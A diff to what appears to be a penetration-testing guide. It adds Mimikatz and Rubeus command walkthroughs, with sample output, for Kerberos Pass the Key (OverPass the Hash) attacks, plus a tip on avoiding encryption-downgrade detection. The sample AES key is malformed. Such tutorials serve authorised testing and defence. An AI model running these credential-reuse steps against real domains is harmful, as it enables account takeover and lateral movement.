@@ -4284,13 +4284,13 @@ mimikatz # sekurlsa::ekeys
 ```cmd
 Authentication Id : 0 ; 444066 (00000000:0006c6a2)
 Session           : Interactive from 1
-User Name         : plaintext
+User Name         : <USER>
 Domain            : <DOMAIN>
 Logon Server      : DC01
 Logon Time        : 7/12/2025 9:42:15 AM
 SID               : S-1-5-21-228825152-3134732153-3833540767-1107
 
-         * Username : plaintext
+         * Username : <USER>
          * Domain   : <DOMAIN>.local
          * Password : (null)
          * Key List :
@@ -4303,6 +4303,67 @@ SID               : S-1-5-21-228825152-3134732153-3833540767-1107
 ```
 
 Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash aka. Pass the Key attack using Mimikatz and Rubeus.
+
+</details>
+
+<details>
+<summary><h5>Mimikatz - Pass the Key aka. OverPass the Hash</h5></summary>
+
+**Start Mimikatz as Adminitrator**
+
+```cmd
+mimikatz.exe
+```
+
+**Extract Kerberos keys**
+
+```cmd
+mimikatz # privilege::debug
+mimikatz # sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<NTLM_HASH>
+```
+
+**Expcted Output**
+
+```cmd
+user    : <USER>
+domain  : <DOMAIN>
+program : cmd.exe
+impers. : no
+NTLM    : <NTLM_HASH>
+  |  PID  1128
+  |  TID  3268
+  |  LSA Process is now R/W
+  |  LUID 0 ; 3414364 (00000000:0034195c)
+  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
+  \_ kerberos - data copy @ 000001C7E20EE578
+   \_ aes256_hmac       -> null
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 000001C7E2136BC8 (32) -> null
+```
+
+This will create a new **cmd.exe** window that we can use to request access to any service we want in the context of the target user.
+
+</details>
+
+<details>
+<summary><h5>Rubeus - Pass the Key aka. OverPass the Hash</h5></summary>
+
+**Start Rubeus**
+
+```cmd
+Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3Sfe60 /nowrap
+```
+
+> **NOTE:** Rubeus doesn't require administrative rights to perform the Pass the Key.
+
+> **NOTE:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use an `rc4_hmac` (NTLM) hash in a Kerberos exchange instead of an `aes256_cts_hmac_sha1` (or aes128) key, it may be detected as an "encryption downgrade."
+
+To learn more about the difference between Mimikatz sekurlsa::pth and Rubeus asktgt, consult the Rubeus tool documentation [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).
 
 </details>
 
